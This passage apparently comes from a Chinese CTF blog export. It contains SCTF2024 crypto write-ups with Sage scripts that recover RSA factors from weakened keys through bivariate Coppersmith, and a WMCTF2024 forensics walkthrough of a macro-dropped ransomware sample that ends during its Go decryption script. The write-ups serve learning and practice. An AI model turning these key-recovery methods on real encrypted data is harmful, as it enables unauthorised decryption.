p,q</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Gift</span>(<span class="params">self</span>):</span><br><span class="line">        p,q = self.p, self.q</span><br><span class="line">        <span class="keyword">return</span> (p^<span class="number">2</span> + p + <span class="number">1</span>)*(q^<span class="number">2</span> + q + <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keyGen</span>(<span class="params">self</span>):</span><br><span class="line">        nbits = self.nbits</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            d = randint(<span class="number">2</span>^(nbits//<span class="number">4</span>),<span class="number">2</span>^(nbits//<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">if</span> gcd(d,self.Gift) != <span class="number">1</span>:</span><br><span class="line">                d = randint(<span class="number">2</span>^(nbits//<span class="number">4</span>),<span class="number">2</span>^(nbits//<span class="number">2</span>))</span><br><span class="line">            e = <span class="built_in">pow</span>(d,-<span class="number">1</span>,self.phi)</span><br><span class="line">            <span class="keyword">return</span> (self.p,self.q,self.n,e,d),(self.n,e)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">RRR = RSA(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">bp = long_to_bytes(<span class="built_in">int</span>(RRR.p))</span><br><span class="line">FLAG = <span class="string">&#x27;SCTF&#123;&#x27;</span>+md5(bp).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N = <span class="subst">&#123;RRR.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;RRR.pub[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">N = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951</span></span><br><span class="line"><span class="string">e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里的phi变成了(p^2 + p + 1)*(q^2 + q + 1)，也就是<br>$$<br>ed&#x3D;1 (mod \varphi)<br>$$</p><p>$$<br>ed&#x3D;1+k(p^2+p+1)(q^2+q+1)<br>$$</p><p>$$<br>ed&#x3D;1+k(n^2-n+1+(n+1)(p+q)+(p+q)^2)<br>$$</p><p>$$<br>0\equiv 1+k(n^2-n+1+(n+1)(p+q)+(p+q)^2)\ (mod\ e)<br>$$</p><p>令x&#x3D;k，y&#x3D;p+q，即可进行二元coppersmith</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">def small_roots(f, bounds, m=1, d=None):#多元copper</span><br><span class="line">    if not d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(0)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = Sequence([], f.parent())</span><br><span class="line">    for i in range(m + 1):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        for shifts in itertools.product(range(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(map(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) for monomial in monomials]</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, 1 / factor)</span><br><span class="line">    H = Sequence([], f.parent().change_ring(QQ))</span><br><span class="line">    for h in filter(None, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        if I.dimension() == -1:</span><br><span class="line">            H.pop()</span><br><span class="line">        elif I.dimension() == 0:</span><br><span class="line">            roots = []</span><br><span class="line">            for root in I.variety(ring=ZZ):</span><br><span class="line">                root = tuple(R(root[var]) for var in f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            return roots</span><br><span class="line">    return []</span><br><span class="line">N = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951</span><br><span class="line">e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840</span><br><span class="line">PR.&lt;x, y&gt; = PolynomialRing(Zmod(e))</span><br><span class="line">f = 1 + x * (N ^ 2 - N + 1 + (N + 1) * y + y ^ 2)</span><br><span class="line">a,b = small_roots(f, bounds = (2 ^ 512, 2 ^ 513), m = 3, d = 2)[0]</span><br><span class="line">var(&#x27;x y&#x27;)</span><br><span class="line">solve([x+y==int(b),x*y==N],[x,y])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002172441065.png" alt="image-20241002172441065"></p><h4 id="不完全阻塞干扰"><a href="#不完全阻塞干扰" class="headerlink" title="不完全阻塞干扰"></a>不完全阻塞干扰</h4><p>题目给了一个不完整的私钥文件和以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The ship crashed into the sun, causing a massive magnetic storm</span></span><br><span class="line"><span class="comment">#part of script</span></span><br><span class="line">msg = bytes_to_long(FLAG)</span><br><span class="line">n = p^<span class="number">5</span>*q^<span class="number">2</span></span><br><span class="line">phi = p^<span class="number">4</span>*(p-<span class="number">1</span>)*q*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(d,phi)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="comment"># c = 145554802564989933772666853449758467748433820771006616874558211691441588216921262672588167631397770260815821197485462873358280668164496459053150659240485200305314288108259163251006446515109018138298662011636423264380170119025895000021651886702521266669653335874489612060473962259596489445807308673497717101487224092493721535129391781431853820808463529747944795809850314965769365750993208968116864575686200409653590102945619744853690854644813177444995458528447525184291487005845375945194236352007426925987404637468097524735905540030962884807790630389799495153548300450435815577962308635103143187386444035094151992129110267595908492217520416633466787688326809639286703608138336958958449724993250735997663382433125872982238289419769011271925043792124263306262445811864346081207309546599603914842331643196984128658943528999381048833301951569809038023921101787071345517702911344900151843968213911899353962451480195808768038035044446206153179737023140055693141790385662942050774439391111437140968754546526191031278186881116757268998843581015398070043778631790328583529667194481319953424389090869226474999123124532354330671462280959215310810005231660418399403337476289138527331553267291013945347058144254374287422377547369897793812634181778309679601143245890494670013019155942690562552431527149178906855998534415120428884098317318129659099377634006938812654262148522236268027388683027513663867042278407716812565374141362015467076472409873946275500942547114202939578755575249750674734066843408758067001891408572444119999801055605577737379889503505649865554353749621313679734666376467890526136184241450593948838055612677564667946098308716892133196862716086041690426537245252116765796203427832657608512488619438752378624483485364908432609100523022628791451171084583484294929190998796485805496852608557456380717623462846198636093701726099310737244471075079541022111303662778829695340275795782631315412134758717966727565043332335558077486037869874106819581519353856396937832498623662166446395755447101393825864584024239951058366713573567250863658531585064635727070458886746791722270803893438211751165831616861912569513431821959562450032831904268205845224077709362068478</span></span><br></pre></td></tr></table></figure><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002220823339.png" alt="image-20241002220823339"></p><p>先手撕一下私钥</p><blockquote><p>当时由于对后面的两个已知部分密钥手撕的问题，导致卡住了。。。</p></blockquote><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002220951499.png" alt="image-20241002220951499"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n=0x067f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f22486cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08ea52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd6890a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b503880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd7841096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3fbb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b258d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be85054faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f97328070c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e9046385356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad941812d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c902b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb2089bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5</span><br></pre></td></tr></table></figure><p>接下来的base64解码时，都需要先把开头的o删掉，这样才能看到熟悉的tag头181</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002221256841.png" alt="image-20241002221256841"></p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002221331466.png" alt="image-20241002221331466"></p><p>这里得到的分别是p和q的高位</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ph=0x8063d0a21876e5ce1e2101c20015529066ed9976882d1002a29efe0f2fdfcc2743fc9a4b5b651cc97108699eca2fb1f3d93175bae343e7c92e4a41c72d05e570194</span><br><span class="line">qh=0xe4f0fe49f9ae1492c097a0a988fa71876625fe4fce05b0204f1fdf43ec64b4dac699d28e166efdfc7562d19e58c3493d9100365cf2840b46c0f6ee8d964807170ff2c13c4eb8012ecab37862a39</span><br></pre></td></tr></table></figure><p>显然接下来就是二元coppersmith</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">import libnum</span><br><span class="line">def small_roots(f, bounds, m=1, d=None):</span><br><span class="line">    if not d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(0)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = Sequence([], f.parent())</span><br><span class="line">    for i in range(m + 1):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        for shifts in itertools.product(range(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(map(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) for monomial in monomials]</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, 1 / factor)</span><br><span class="line">    H = Sequence([], f.parent().change_ring(QQ))</span><br><span class="line">    for h in filter(None, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        if I.dimension() == -1:</span><br><span class="line">            H.pop()</span><br><span class="line">        elif I.dimension() == 0:</span><br><span class="line">            roots = []</span><br><span class="line">            for root in I.variety(ring=ZZ):</span><br><span class="line">                root = tuple(R(root[var]) for var in f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            return roots</span><br><span class="line">    return []</span><br><span class="line">c = 145554802564989933772666853449758467748433820771006616874558211691441588216921262672588167631397770260815821197485462873358280668164496459053150659240485200305314288108259163251006446515109018138298662011636423264380170119025895000021651886702521266669653335874489612060473962259596489445807308673497717101487224092493721535129391781431853820808463529747944795809850314965769365750993208968116864575686200409653590102945619744853690854644813177444995458528447525184291487005845375945194236352007426925987404637468097524735905540030962884807790630389799495153548300450435815577962308635103143187386444035094151992129110267595908492217520416633466787688326809639286703608138336958958449724993250735997663382433125872982238289419769011271925043792124263306262445811864346081207309546599603914842331643196984128658943528999381048833301951569809038023921101787071345517702911344900151843968213911899353962451480195808768038035044446206153179737023140055693141790385662942050774439391111437140968754546526191031278186881116757268998843581015398070043778631790328583529667194481319953424389090869226474999123124532354330671462280959215310810005231660418399403337476289138527331553267291013945347058144254374287422377547369897793812634181778309679601143245890494670013019155942690562552431527149178906855998534415120428884098317318129659099377634006938812654262148522236268027388683027513663867042278407716812565374141362015467076472409873946275500942547114202939578755575249750674734066843408758067001891408572444119999801055605577737379889503505649865554353749621313679734666376467890526136184241450593948838055612677564667946098308716892133196862716086041690426537245252116765796203427832657608512488619438752378624483485364908432609100523022628791451171084583484294929190998796485805496852608557456380717623462846198636093701726099310737244471075079541022111303662778829695340275795782631315412134758717966727565043332335558077486037869874106819581519353856396937832498623662166446395755447101393825864584024239951058366713573567250863658531585064635727070458886746791722270803893438211751165831616861912569513431821959562450032831904268205845224077709362068478</span><br><span class="line">n=0x067f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f22486cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08ea52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd6890a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b503880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd7841096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3fbb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b258d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be85054faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f97328070c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e9046385356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad941812d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c902b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb2089bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5</span><br><span class="line">ph = 0x008063D0A21876E5CE1E2101C20015529066ED9976882D1002A29EFE0F2FDFCC2743FC9A4B5B651CC97108699ECA2FB1F3D93175BAE343E7C92E4A41C72D05E570194</span><br><span class="line">qh = 0x00E4F0FE49F9AE1492C097A0A988FA71876625FE4FCE05B0204F1FDF43EC64B4DAC699D28E166EFDFC7562D19E58C3493D9100365CF2840B46C0F6EE8D964807170FF2C13C4EB8012ECAB37862A39</span><br><span class="line">ph=ph&lt;&lt;(1024-524)</span><br><span class="line">qh=qh&lt;&lt;(1024-620)</span><br><span class="line">e=65537</span><br><span class="line">PR.&lt;x1,x2&gt; = Zmod(n)[]</span><br><span class="line">f = (ph + x1) ^ 5 * (qh + x2) ^ 2</span><br><span class="line">pl,ql=small_roots(f, bounds=(2**(1024-524), 2**(1024-620)), m=2, d=3)[0]</span><br><span class="line">p=int(pl)+ph</span><br><span class="line">q=int(ql)+qh</span><br><span class="line">phi = p^4*(p-1)*q*(q-1)</span><br><span class="line">d = inverse_mod(e,phi)</span><br><span class="line">m=int(pow(c,d,n))</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002233627615.png" alt="image-20241002233627615"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> SCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WMCTF2024 部分Misc 复现</title>
      <link href="/posts/cc16e4/"/>
      <url>/posts/cc16e4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>misc那么多题，除了签到题一题都不会。。。o(╥﹏╥)o其中party time这题因为不会逆向而卡住了。。。不懂的还是太多了，还得多沉淀沉淀。</p><p>在这里复现一下学长出的两道取证题。</p></blockquote><h3 id="Party-Time"><a href="#Party-Time" class="headerlink" title="Party Time"></a>Party Time</h3><p>ftk挂载一下，可以看到桌面上有flag.rar，Party invitation.docm和readme.txt，提取出来</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924002423222.png" alt="image-20240924002423222"></p><p>把party invitation.docm丢进云沙箱，不出意料的报毒了，可以看到在宏里面执行了一个ps命令，下载了一个叫做windows_update_20240813.exe的程序，大概是个病毒。</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924003410144.png" alt="image-20240924003410144"></p><p>用volatility从所给的镜像中找一下这个程序在哪，用ftk提取出来。</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924004413133.png" alt="image-20240924004413133"></p><blockquote><p>当时就是卡这了，因为不会逆向。。。</p></blockquote><p>对这个exe程序进行逆向，可以发现这个程序简单来说是会自动对文件进行OAEP填充的RSA加密的操作，也就是一个勒索病毒。</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924005108852.png" alt="image-20240924005108852"></p><p>可以看到，公钥和私钥都被藏在了注册表里</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924005428298.png" alt="image-20240924005428298"></p><p>还有个devicekey，是对主机名进行了sha256加密</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924005522228.png" alt="image-20240924005522228"></p><p>用volatility提取注册表中的私钥，以及查看主机名（可通过查看环境变量得到）</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924005959512.png" alt="image-20240924005959512"></p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924010338906.png" alt="image-20240924010338906"></p><p>写脚本进行解密，这里直接贴官方脚本</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/rsa&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/x509&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/pem&quot;</span></span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// Function to load RSA keys from files</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadRSAKeys</span><span class="params">()</span></span> (*rsa.PrivateKey, <span class="type">error</span>) &#123;</span><br><span class="line">privateKeyPEM, err := ioutil.ReadFile(<span class="string">&quot;private_key.pem&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">block, _ := pem.Decode(privateKeyPEM)</span><br><span class="line"><span class="keyword">if</span> block == <span class="literal">nil</span> || block.Type != <span class="string">&quot;RSA PRIVATE KEY&quot;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to decode PEM block containing private key&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> privateKey, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Function to decrypt data using RSA and device key</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decrypt</span><span class="params">(encryptedData []<span class="type">byte</span>, privateKey *rsa.PrivateKey, deviceKey []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">hash := sha256.New()</span><br><span class="line">decryptedData, err := rsa.DecryptOAEP(hash, rand.Reader, privateKey, encryptedData, deviceKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> decryptedData, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printHelp</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Usage:&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;  -help                Show this help message&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;  -decrypt &lt;file&gt;      Decrypt the specified file (requires device key)&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;  -key &lt;key&gt;           Device key for decryption&quot;</span>)</span><br><span 